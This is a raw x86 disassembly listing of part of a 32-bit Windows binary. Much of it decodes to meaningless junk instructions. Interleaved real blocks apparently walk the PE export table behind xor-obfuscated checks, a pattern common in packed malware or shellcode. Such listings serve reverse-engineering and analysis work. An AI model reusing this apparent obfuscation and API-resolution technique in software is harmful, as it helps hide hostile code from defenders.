  4020e4:	xchg   ecx,eax
  4020e5:	push   ebp
  4020e6:	xchg   ecx,eax
  4020e7:	imul   ebp,ebp,0xec805284
  4020ed:	or     al,0x9a
  4020ef:	inc    ebx
  4020f0:	shr    esp,cl
  4020f2:	cmp    BYTE PTR [ecx],ah
  4020f4:	mov    DWORD PTR ds:0xda4d3e5f,ebx
  4020fa:	test   eax,0x80fa1f1b
  4020ff:	ret    0xa437
  402102:	jnp    0x40211b
  402104:	pusha  
  402105:	sbb    BYTE PTR [edx],al
  402107:	xchg   esi,eax
  402108:	aam    0x52
  40210a:	inc    ebx
  40210b:	jb     0x40213e
  40210d:	sub    ebx,DWORD PTR [edi+0x62]
  402110:	cmp    ch,cl
  402112:	mul    BYTE PTR [esi+eiz*1-0xf]
  402116:	out    dx,al
  402117:	add    DWORD PTR [edi-0x57],esi
  40211a:	(bad)  
  40211b:	lods   al,BYTE PTR ds:[esi]
  40211c:	inc    esp
  40211d:	mov    DWORD PTR [ecx+0x18e37c41],esp
  402123:	sub    edi,ecx
  402125:	xor    BYTE PTR [ebp-0x1d],bh
  402128:	imul   esi,DWORD PTR [ebp-0x6dd67eb2],0x868d3fa3
  402132:	push   0x6
  402134:	leave  
  402135:	lds    eax,FWORD PTR [ebp-0x5bf85586]
  40213b:	inc    edi
  40213c:	push   ecx
  40213d:	dec    esi
  40213e:	jmp    0x6a1acb62
  402143:	push   esi
  402144:	push   ss
  402145:	lods   al,BYTE PTR ds:[esi]
  402146:	sahf   
  402147:	loope  0x40218e
  402149:	dec    esp
  40214a:	add    eax,0x261a864
  40214f:	or     BYTE PTR [ebp-0x6f],ch
  402152:	or     edx,esi
  402154:	cmp    al,0xc5
  402156:	adc    cl,al
  402158:	adc    al,BYTE PTR ds:[ecx+ebx*8+0x69cec00f]
  402160:	nop
  402161:	sub    bl,BYTE PTR [edx]
  402163:	daa    
  402164:	ins    DWORD PTR es:[edi],dx
  402165:	aad    0x5a
  402167:	mov    ds:0x79a70047,al
  40216c:	pop    eax
  40216d:	or     DWORD PTR [esi+0x3815dad3],ebx
  402173:	dec    edi
  402174:	jge    0x40214d
  402176:	mov    eax,ds:0xc41140ff
  40217b:	pop    edi
  40217c:	(bad)  
  40217e:	sbb    ah,BYTE PTR [edi]
  402180:	pop    esp
  402181:	das    
  402182:	push   ss
  402183:	fld    QWORD PTR [esp+edx*1+0x188cf7b4]
  40218a:	add    BYTE PTR es:[esi],bh
  40218d:	cld    
  40218e:	jnp    0x4021c7
  402190:	jne    0x402113
  402192:	or     BYTE PTR [ecx+0x2a48141f],bl
  402198:	imul   DWORD PTR [eax+0xcd54ead]
  40219e:	les    ecx,FWORD PTR [edx]
  4021a0:	out    0xba,al
  4021a2:	sbb    DWORD PTR [ebx+0x2b],0x6943adb9
  4021a9:	psubsb mm2,QWORD PTR [ecx+0x1ffd2681]
  4021b0:	pop    ebp
  4021b1:	lar    esi,WORD PTR [ebp+0x51d225b3]
  4021b8:	iret   
  4021b9:	inc    ebx
  4021ba:	sbb    DWORD PTR [eax+edi*4],0x75
  4021be:	or     DWORD PTR [esi],eax
  4021c0:	push   edx
  4021c1:	sbb    eax,0xb401c97a
  4021c6:	adc    al,0x2b
  4021c8:	sbb    esi,DWORD PTR [esi]
  4021ca:	xor    cl,bh
  4021cc:	inc    edi
  4021cd:	xor    BYTE PTR [ebx+0x6a],0xa0
  4021d1:	push   esi
  4021d2:	jno    0x40222b
  4021d4:	out    dx,al
  4021d5:	mov    eax,0xe20cec20
  4021da:	inc    ecx
  4021db:	leave  
  4021dc:	nop
  4021dd:	dec    esp
  4021de:	push   0xffffff86
  4021e0:	dec    ecx
  4021e1:	stos   DWORD PTR es:[edi],eax
  4021e2:	fstp   DWORD PTR es:[eax-0x38]
  4021e6:	ins    BYTE PTR es:[edi],dx
  4021e7:	jno    0x40221e
  4021e9:	ficom  DWORD PTR [edi+0x6c08f8fb]
  4021ef:	hlt    
  4021f0:	aaa    
  4021f1:	xor    eax,0xa711da96
  4021f6:	mov    WORD PTR [edi+0x35],ds
  4021f9:	popa   
  4021fa:	cmp    eax,0xe4fd9fcd
  4021ff:	xchg   edx,eax
  402200:	inc    esp
  402201:	dec    ebp
  402202:	imul   ebp,DWORD PTR [edi+0x3e146cfd],0xffffffa3
  402209:	pop    esi
  40220a:	adc    BYTE PTR [eax-0x255d37e8],cl
  402210:	mov    al,ds:0x5f58824f
  402215:	add    edi,ecx
  402217:	cmp    ah,cl
  402219:	fst    QWORD PTR [eax]
  40221b:	xchg   edx,eax
  40221c:	icebp  
  40221d:	push   0x67db1b0
  402222:	mov    ecx,0x8911de30
  402227:	sub    DWORD PTR [ecx+0x770cf138],ebx
  40222d:	dec    ecx
  40222e:	xor    DWORD PTR [esi-0x5cd7db71],esi
  402234:	js     0x4021c4
  402236:	sub    al,0x77
  402238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402239:	int3   
  40223a:	mov    al,0xc7
  40223c:	xchg   edx,eax
  40223d:	lock mov edx,0xdf0da822
  402243:	mov    cl,BYTE PTR [ecx]
  402245:	repz popf 
  402247:	imul   esp,DWORD PTR [esi],0xbbdd513d
  40224d:	stc    
  40224e:	mov    al,BYTE PTR [eax-0x318e4693]
  402254:	popf   
  402255:	lock inc esi
  402257:	sbb    esi,esi
  402259:	push   ebx
  40225a:	scas   al,BYTE PTR es:[edi]
  40225b:	ds aad 0x2b
  40225e:	sub    DWORD PTR [edx+0x10],ebx
  402261:	call   0x89a63706
  402266:	dec    ebp
  402267:	cld    
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	cmovns ebx,DWORD PTR [edi-0x34]
  4022cd:	pop    es
  4022ce:	mov    dh,0x3
  4022d0:	jle    0x402350
  4022d2:	mov    ch,0x7f
  4022d4:	jle    0x402354
  4022d6:	inc    edi
  4022d7:	jnp    0x4022d1
  4022d9:	sub    al,0xed
  4022db:	pop    ss
  4022dc:	cli    
  4022dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022de:	xchg   esp,eax
  4022df:	test   BYTE PTR [ecx+edi*4-0x760dbeaa],0x0
  4022e7:	cmp    al,0xf7
  4022e9:	cmp    BYTE PTR [eax+0x7e],bl
  4022ec:	fs push ebx
  4022ee:	mov    eax,0x268672db
  4022f3:	jmp    0xff65:0x38c018ea
  4022fa:	push   esi
  4022fb:	inc    ebx
  4022fc:	aam    0xee
  4022fe:	xchg   edx,ecx
  402300:	daa    
  402301:	mov    bh,cl
  402303:	fwait
  402304:	xlat   BYTE PTR ds:[ebx]
  402305:	push   0x7670846b
  40230a:	cmp    ebx,0xf2c589b1
  402310:	adc    al,0x49
  402312:	scas   eax,DWORD PTR es:[edi]
  402313:	js     0x4022f9
  402315:	mov    dl,dl
  402317:	aas    
  402318:	fisub  DWORD PTR [edx]
  40231a:	xchg   DWORD PTR [ebx-0x3fe2edc7],esp
  402320:	mov    edi,0xa0738d91
  402325:	jns    0x402312
  402327:	hlt    
  402328:	xchg   ebp,eax
  402329:	jne    0x4022ca
  40232b:	rcl    BYTE PTR [edx],cl
  40232d:	retf   
  40232e:	(bad)  
  40232f:	jmp    DWORD PTR [edx+0x7537e320]
  402335:	adc    ch,BYTE PTR [edx-0x39]
  402338:	pop    ds
  402339:	int    0x86
  40233b:	inc    ecx
  40233c:	pop    eax
  40233d:	dec    edx
  40233e:	inc    edx
  40233f:	mov    bh,0x75
  402341:	add    al,0xd1
  402343:	inc    esp
  402344:	jl     0x402327
  402346:	sbb    al,0x49
  402348:	(bad)  
  402349:	sub    BYTE PTR [esp+ebp*2-0x45],ah
  40234d:	sbb    BYTE PTR [ebx-0x51],dh
  402350:	jle    0x402381
  402352:	fst    QWORD PTR [ecx]
  402354:	je     0x40230b
  402356:	pop    esp
  402357:	(bad)  
  402358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402359:	or     cl,BYTE PTR [ecx-0x3c2ee1a1]
  40235f:	jmp    FWORD PTR [esi+0x2]
  402362:	gs jecxz 0x4023bc
  402365:	out    0x1f,al
  402367:	mov    ds:0xed90423a,al
  40236c:	pushf  
  40236d:	repnz jecxz 0x402347
  402370:	test   eax,0x68b525ba
  402375:	push   ecx
  402376:	jmp    0x3bdb:0x2e870880
  40237d:	fmul   st,st(3)
  40237f:	sub    ch,BYTE PTR [eax-0x260db157]
  402385:	idiv   DWORD PTR [ebx*4-0x68c1e041]
  40238c:	push   0xffffff87
  40238e:	loope  0x402340
  402390:	jmp    0xb944ee53
  402395:	scas   al,BYTE PTR es:[edi]
  402396:	xchg   BYTE PTR [ecx-0x4f],ch
  402399:	inc    esi
  40239a:	into   
  40239b:	cmp    eax,0xf69fc25
  4023a0:	mov    ebx,0xfef23d48
  4023a5:	inc    ecx
  4023a6:	mov    esi,0xd5436de5
  4023ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023ac:	inc    esi
  4023ad:	pop    ebx
  4023ae:	rcr    dh,1
  4023b0:	idiv   ch
  4023b2:	in     al,dx
  4023b3:	loopne 0x40241d
  4023b5:	sub    cl,BYTE PTR [edi]
  4023b7:	mov    BYTE PTR [edi+0x39539e53],0x50
  4023be:	rol    dh,0xa6
  4023c1:	mov    edi,0x4dda02e4
  4023c6:	add    DWORD PTR [edi+0x1a],esp
  4023c9:	les    eax,FWORD PTR ds:0xfd0be398
  4023cf:	xor    bh,ch
  4023d1:	jg     0x4023dc
  4023d3:	repnz cs std 
  4023d6:	push   ecx
  4023d7:	xchg   DWORD PTR [ecx-0x73],ebp
  4023da:	push   es
  4023db:	icebp  
  4023dc:	hlt    
  4023dd:	icebp  
  4023de:	scas   al,BYTE PTR es:[edi]
  4023df:	inc    esi
  4023e0:	push   ecx
  4023e1:	data16 xor cl,BYTE PTR es:[ecx+edx*2]
  4023e6:	mov    dh,0xf5
  4023e8:	in     al,dx
  4023e9:	sub    al,0x93
  4023eb:	mov    esi,0xa30bc323
  4023f0:	pop    edx
  4023f1:	mov    ds:0x6d8ddb67,al
  4023f6:	ficomp DWORD PTR [eax]
  4023f8:	mov    ds:0x4fe1027,al
  4023fd:	lods   al,BYTE PTR ds:[esi]
  4023fe:	out    0x67,eax
  402400:	xchg   esp,eax
  402401:	mov    ch,BYTE PTR [eax+edi*1]
  402404:	loope  0x4023fc
  402406:	ss pop esi
  402408:	(bad)  
  402409:	out    dx,al
  40240a:	jbe    0x40238c
  40240c:	xchg   ecx,eax
  40240d:	inc    esp
  40240e:	sub    ebx,DWORD PTR ds:0x245cfce6
  402414:	jns    0x402489
  402416:	stc    
  402417:	xor    al,0x6a
  402419:	fdivr  st,st(6)
  40241b:	xchg   edx,eax
  40241c:	adc    al,0x8b
  40241e:	scas   al,BYTE PTR es:[edi]
  40241f:	mov    ecx,0xd4d3615c
  402424:	sti    
  402425:	inc    esp
  402426:	es iret 
  402428:	in     eax,dx
  402429:	mov    dh,0xaf
  40242b:	mov    dh,0x70
  40242d:	pop    ecx
  40242e:	setbe  cl
  402431:	(bad)  [ebx-0x28]
  402434:	lods   al,BYTE PTR ds:[esi]
  402435:	daa    
  402436:	lock dec esp
  402438:	mov    dl,al
  40243a:	(bad)  [eax+0x785bdf29]
  402440:	div    ecx
  402442:	cs nop
  402444:	outs   dx,DWORD PTR ds:[esi]
  402445:	aaa    
  402446:	cmp    al,al
  402448:	sub    dl,dh
  40244a:	fidivr DWORD PTR [ebx]
  40244c:	fdiv   QWORD PTR [eax]
  40244e:	imul   BYTE PTR [edi-0x2e843ed2]
  402454:	push   0xffffffef
  402456:	outs   dx,DWORD PTR ds:[esi]
  402457:	jb     0x402458
  402459:	sbb    esi,DWORD PTR [edx-0x7c]
  40245c:	mov    bh,ah
  40245e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40245f:	call   0xd39f:0x559ba89
  402466:	loop   0x402412
  402468:	bound  esi,QWORD PTR [ecx]
  40246a:	sar    BYTE PTR [edx],cl
  40246c:	lea    ebp,[edx]
  40246e:	pop    es
  40246f:	fcmovb st,st(2)
  402471:	jmp    0x7222:0x59a51540
  402478:	jne    0x4024c9
  40247a:	add    BYTE PTR [edx+0x40440cb6],0x39
  402481:	pop    ds
  402482:	adc    DWORD PTR [ebp-0x6e853f27],ebp
  402488:	push   eax
  402489:	add    al,0xa2
  40248b:	scas   al,BYTE PTR es:[edi]
  40248c:	aad    0x8b
  40248e:	dec    ebp
  40248f:	clc    
  402490:	mov    ecx,DWORD PTR [ecx]
  402492:	mov    eax,DWORD PTR [eax+ecx*1]
  402495:	mov    DWORD PTR [ebp-0x1c],eax
  402498:	mov    eax,DWORD PTR [ebp+0x8]
  40249b:	xor    eax,esi
  40249d:	add    eax,edi
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0xa8995480
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	cdq    
  4024da:	push   ebx
  4024db:	mov    ebp,0x8bd279e5
  4024e0:	mov    al,ds:0x3897cf28
  4024e5:	jg     0x402478
  4024e7:	in     al,dx
  4024e8:	push   edi
  4024e9:	and    dh,BYTE PTR [eax]
  4024eb:	xchg   BYTE PTR [eax-0x14],dl
  4024ee:	mov    esi,0xab1585f7
  4024f3:	inc    edx
  4024f4:	pushf  
  4024f5:	aam    0xe2
  4024f7:	outs   dx,BYTE PTR ds:[esi]
  4024f8:	inc    ebx
  4024f9:	inc    esi
  4024fa:	mov    ch,0xc
  4024fc:	scas   al,BYTE PTR es:[edi]
  4024fd:	mov    ch,0xe5
  4024ff:	mov    edx,0xbe3bb74f
  402504:	int    0x53
  402506:	jmp    0x4024f2
  402508:	fcom   DWORD PTR ds:[ebx]
  40250b:	push   ecx
  40250c:	aaa    
  40250d:	jno    0x4024f2
  40250f:	push   edi
  402510:	cwde   
  402511:	mov    WORD PTR [edx+0x27],es
  402514:	sub    al,0x53
  402516:	or     cl,BYTE PTR [ebx+0x49b83342]
  40251c:	loopne 0x4024c4
  40251e:	inc    ebx
  40251f:	dec    ecx
  402520:	out    dx,eax
  402521:	inc    edx
  402522:	fldenv [eax+0x19]
  402525:	mov    cl,0xd6
  402527:	pop    esi
  402528:	icebp  
  402529:	mov    eax,0x82358e03
  40252e:	call   0xbfbf:0x39857959
  402535:	es das 
  402537:	loopne 0x4025af
  402539:	mov    ebx,ebp
  40253b:	pop    es
  40253c:	cdq    
  40253d:	push   cs
  40253e:	hlt    
  40253f:	mov    al,ds:0x3798c3be
  402544:	mov    cl,0xb8
  402546:	ins    DWORD PTR es:[edi],dx
  402547:	call   DWORD PTR [ecx-0x16]
  40254a:	pop    ebp
  40254b:	pop    es
  40254c:	scas   al,BYTE PTR es:[edi]
  40254d:	mov    esp,0x97ddab5c
  402552:	mov    edx,0x2c77d7ec
  402557:	imul   edi,DWORD PTR [esp+edx*2],0xffffffb1
  40255b:	xchg   esp,eax
  40255c:	pop    es
  40255d:	sub    bl,BYTE PTR [edx]
  40255f:	call   0xcc9e424d
  402564:	adc    bh,BYTE PTR [ebp-0x7b]
  402567:	mov    ds:0xdde3727e,al
  40256c:	out    dx,eax
  40256d:	push   ds
  40256e:	push   esi
  40256f:	mov    ch,0xaa
  402571:	and    al,0xaa
  402573:	add    eax,0xdb2038b
  402578:	fisttp WORD PTR [esi+edx*4]
  40257b:	test   DWORD PTR [ecx-0x10c59170],eax
  402581:	dec    esi
  402582:	dec    ebx
  402583:	call   0x84c4:0xa1a162af
  40258a:	and    ah,BYTE PTR [edi]
  40258c:	fisttp DWORD PTR [esi-0x1890ba3b]
  402592:	pop    ds
  402593:	pop    ebx
  402594:	scas   eax,DWORD PTR es:[edi]
  402595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402596:	ss jecxz 0x402532
  402599:	cmc    
  40259a:	sbb    edx,DWORD PTR [eax+0x3f8dbfb6]
  4025a0:	cmp    al,0x93
  4025a2:	jo     0x40256f
  4025a4:	adc    al,0xa4
  4025a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025a7:	in     al,dx
  4025a8:	add    eax,0xf32c9345
  4025ad:	jmp    0x4025c8
  4025af:	ret    0xef99
  4025b2:	cmp    al,0x32
  4025b4:	sub    edx,DWORD PTR [edx+0x6f1b9612]
  4025ba:	mov    edi,0x2c906043
  4025bf:	or     al,0xad
  4025c1:	mov    bl,0x21
  4025c3:	sub    dh,BYTE PTR [esi-0x2db7c0bd]
  4025c9:	outs   dx,DWORD PTR ds:[esi]
  4025ca:	aad    0x4d
  4025cc:	add    eax,0x22765ccb
  4025d1:	(bad)  
  4025d2:	mov    al,ds:0x31153a85
  4025d7:	pushf  
  4025d8:	cmp    bh,BYTE PTR [edx-0x139179f1]
  4025de:	xchg   ecx,eax
  4025df:	jne    0x402586
  4025e1:	adc    BYTE PTR [ebx],0x41
  4025e4:	daa    
  4025e5:	icebp  
  4025e6:	cmp    DWORD PTR [edi-0x47d3f5aa],edi
  4025ec:	xor    esi,ebx
  4025ee:	lahf   
  4025ef:	sahf   
  4025f0:	enter  0x607f,0x54
  4025f4:	push   0xfffffff0
  4025f6:	outs   dx,DWORD PTR ds:[esi]
  4025f7:	test   DWORD PTR [ebp+0x77114ee6],ebx
  4025fd:	ficom  WORD PTR [eax-0x52e1340e]
  402603:	mov    edi,ebx
  402605:	pop    ebp
  402606:	loope  0x4025e1
  402608:	iret   
  402609:	jl     0x40258f
  40260b:	ja     0x402619
  40260d:	adc    esi,DWORD PTR [edx+0x75]
  402610:	mov    eax,ds:0xc38c05ab
  402615:	sahf   
  402616:	dec    ebx
  402617:	sbb    al,0x7e
  402619:	lock test dh,bl
  40261c:	(bad)
  402620:	test   ebx,0x7df5b7c5
  402626:	rcr    BYTE PTR [ecx+0x38],1
  402629:	cld    
  40262a:	jns    0x40262f
  40262c:	hlt    
  40262d:	sbb    esp,DWORD PTR [ecx+0x2d]
  402630:	sub    DWORD PTR [eax],0x6796d9d1
  402636:	rol    BYTE PTR [eax+ecx*2-0x5b],cl
  40263a:	sbb    eax,0x235e3645
  40263f:	mov    dh,0xe9
  402641:	mov    dl,0xdc
  402643:	sar    BYTE PTR [edi-0x13],1
  402646:	in     eax,0xec
  402648:	out    dx,al
  402649:	addr16 pop esp
  40264b:	fmul   DWORD PTR [esi-0x14d92dcc]
  402651:	push   es
  402652:	pusha  
  402653:	repz fild DWORD PTR [ecx+0x5dca3edf]
  40265a:	mov    edi,ecx
  40265c:	sar    ah,cl
  40265e:	mov    ds:0xa76621e7,eax
  402663:	loop   0x4025ef
  402665:	dec    ecx
  402666:	mov    ah,0x30
  402668:	into   
  402669:	push   edi
  40266b:	loop   0x4025fc
  40266d:	enter  0x7093,0x41
  402671:	gs sub al,0xaa
  402674:	push   ds
  402675:	repnz into 
  402677:	push   ebx
  402678:	mov    cl,0x4
  40267a:	repz xlat BYTE PTR ds:[ebx]
  40267c:	ret    0xc6fd
  40267f:	mov    eax,ds:0x52935f2e
  402684:	sahf   
  402685:	jo     0x4026bf
  402687:	enter  0x2c8,0x3e
  40268b:	push   edx
  40268c:	inc    esi
  40268d:	ins    DWORD PTR es:[edi],dx
  40268e:	push   ds
  40268f:	mov    eax,0x8be04d89
  402694:	inc    ebp
  402695:	loopne 0x402622
  402697:	dec    ebp
  402698:	clc    
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0xbf
  4026c9:	xlat   BYTE PTR ds:[ebx]
  4026ca:	sbb    ch,BYTE PTR [edx+0x7e7e0f24]
  4026d0:	mov    ch,0x7f
  4026d2:	jle    0x402752
  4026d4:	jle    0x4026cc
  4026d6:	cmc    
  4026d7:	in     eax,0xdc
  4026d9:	add    al,dl
  4026db:	je     0x4026bb
  4026dd:	pop    edx
  4026de:	dec    eax
  4026df:	dec    ebx
  4026e0:	gs int 0x2e
  4026e3:	jg     0x402760
  4026e5:	jae    0x4026ba
  4026e7:	add    esp,DWORD PTR [edx-0x5b]
  4026ea:	push   cs
  4026eb:	imul   edi,ebx,0x3bb437b
  4026f1:	lods   al,BYTE PTR ds:[esi]
  4026f2:	es pushf 
  4026f4:	cld    
  4026f5:	xchg   esi,eax
  4026f6:	cdq    
  4026f7:	push   ecx
  4026f8:	mov    esp,0xec1c8d55
  4026fd:	dec    edx
  4026fe:	mov    eax,0x16d9ce03
  402703:	aam    0xcd
  402705:	sub    eax,0x5dffa589
  40270a:	(bad)  
  40270b:	outs   dx,BYTE PTR ds:[esi]
  40270c:	scas   al,BYTE PTR es:[edi]
  40270d:	clc    
  40270e:	xor    eax,edx
  402710:	fnstcw WORD PTR [eax+0x26]
  402713:	inc    esi
  402714:	outs   dx,DWORD PTR ss:[esi]
  402716:	out    dx,eax
  402717:	inc    eax
  402718:	ja     0x4026bf
  40271a:	cmp    eax,0xdae2e381
  40271f:	xchg   ebx,eax
  402720:	jmp    0xb873e424
  402725:	xchg   ecx,eax
  402726:	sub    al,0x7f
  402728:	sub    DWORD PTR [ecx+esi*4],esp
  40272b:	xchg   ebp,eax
  40272c:	sahf   
  40272d:	jmp    0x402726
  40272f:	ror    BYTE PTR [eax+0x1952f4fd],0x37
  402736:	pusha  
  402737:	adc    al,0xe3
  402739:	pop    ss
  40273a:	test   BYTE PTR [ecx-0x5fce66cd],0x92
  402741:	push   ebx
  402742:	mov    edi,0x13d0e045
  402747:	add    dl,BYTE PTR [ebx]
  402749:	add    DWORD PTR [ecx+0x23],esi
  40274c:	mov    al,ds:0x8125444e
  402751:	sbb    al,BYTE PTR [ebp-0x75]
  402754:	sub    al,0xbb
  402756:	and    DWORD PTR [ecx-0x6d],esp
  402759:	fdiv   st(4),st
  40275b:	dec    ebp
  40275c:	retf   
  40275d:	mov    al,0xd6
  40275f:	mov    eax,ds:0x3e465b5
  402764:	adc    eax,0xc11a678a
  402769:	sti    
  40276a:	lods   eax,DWORD PTR ds:[esi]
  40276b:	mov    ch,0x5c
  40276d:	or     eax,DWORD PTR [edx-0x3c6e6ab3]
  402773:	xchg   edx,eax
  402774:	outs   dx,BYTE PTR ds:[esi]
  402775:	shr    BYTE PTR [ebp+esi*1-0x5],0x7d
  40277a:	or     BYTE PTR [ebx*8+0x58d51737],cl
  402781:	jcxz   0x40278f
  402784:	in     eax,0x92
  402786:	push   ss
  402787:	xlat   BYTE PTR ds:[ebx]
  402788:	cdq    
  402789:	jmp    0x402756
  40278b:	adc    eax,0x80b60a88
  402790:	and    eax,0xaf436525
  402795:	sbb    DWORD PTR [ebx+esi*4],0xdaf84bf9
  40279c:	cs scas al,BYTE PTR es:[edi]
  40279e:	sub    edx,DWORD PTR [ebp+0x6b]
  4027a1:	mov    dh,0x45
  4027a3:	sub    al,0x72
  4027a5:	push   0xffffffd5
  4027a7:	xor    eax,eax
  4027a9:	adc    ah,dh
  4027ab:	mov    ebp,0x5094349d
  4027b0:	jbe    0x40275c
  4027b2:	pusha  
  4027b3:	add    BYTE PTR [ebx+0x60],0xcd
  4027b7:	popf   
  4027b8:	mul    DWORD PTR [esi]
  4027ba:	popa   
  4027bb:	and    cl,BYTE PTR [esi-0x72]
  4027be:	retf   
  4027bf:	rol    DWORD PTR [esp+esi*2-0x789e3e52],1
  4027c6:	arpl   WORD PTR [edx-0x579e3adb],si
  4027cc:	or     eax,DWORD PTR [edx+esi*8]
  4027cf:	aas    
  4027d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027d1:	in     eax,dx
  4027d2:	iret   
  4027d3:	mov    esi,0x7180c0c6
  4027d8:	mov    ch,0x34
  4027da:	inc    edi
  4027db:	push   edx
  4027dc:	add    eax,0x4b65ed78
  4027e1:	ss sti 
  4027e3:	pop    eax
  4027e4:	dec    edi
  4027e5:	or     ah,bl
  4027e7:	pop    edi
  4027e8:	mov    dl,dh
  4027ea:	ds jg  0x402839
  4027ed:	mov    cs,WORD PTR [esi]
  4027ef:	mov    esp,0x82a18187
  4027f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027f5:	outs   dx,DWORD PTR ds:[esi]
  4027f6:	mov    al,ds:0xfb02f38b
  4027fb:	jle    0x40285e
  4027fd:	ss fs ror ch,1
  402801:	(bad)  
  402802:	call   0xf8a647ff
  402807:	and    bh,cl
  402809:	adc    eax,0xf02f1d7e
  40280e:	mov    dl,0xae
  402810:	sub    eax,0xd67f57a5
  402815:	add    al,0x9a
  402817:	adc    eax,0x139057d1
  40281c:	or     BYTE PTR [edx-0x7d],al
  40281f:	sbb    DWORD PTR [ecx+0x29],edi
  402822:	fmulp  st(2),st
  402824:	icebp  
  402825:	hlt    
  402826:	and    DWORD PTR [ecx-0x59a67cff],edx
  40282c:	in     al,0xfc
  40282e:	push   cs
  40282f:	loop   0x402840
  402831:	shl    dh,0x51
  402834:	iret   
  402835:	das    
  402836:	ins    BYTE PTR es:[edi],dx
  402837:	hlt    
  402838:	mov    cl,0x3c
  40283a:	sub    BYTE PTR [edx],bh
  40283c:	hlt    
  40283d:	dec    edi
  40283e:	and    dh,ch
  402840:	ins    BYTE PTR es:[edi],dx
  402841:	adc    al,0x56
  402843:	sbb    edi,ebx
  402845:	cs repnz add ebx,eax
  402849:	jmp    0xb5e6:0x4d3665a8
  402850:	clc    
  402851:	pop    edi
  402852:	icebp  
  402853:	int    0xd6
  402855:	call   0xdeb43592
  40285a:	adc    BYTE PTR [eax+0x18],dl
  40285d:	ins    DWORD PTR es:[edi],dx
  40285e:	ins    DWORD PTR es:[edi],dx
  40285f:	fisub  DWORD PTR [ebp+0x5c5cf3b0]
  402865:	or     eax,DWORD PTR [ebx]
  402867:	lds    edx,FWORD PTR [edx+0x1e94d95]
  40286d:	xor    dh,0xf2
  402870:	enter  0x1227,0xac
  402874:	call   0x1cb5e590
  402879:	mov    bh,0x36
  40287b:	sbb    eax,0x7317c664
  402880:	in     eax,0xbf
  402882:	imul   ecx,DWORD PTR [esi-0x5afc4816],0xffffffa6
  402889:	pop    ecx
  40288a:	mov    BYTE PTR [ecx+0x24e901],cl
  402890:	add    BYTE PTR [eax],al
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
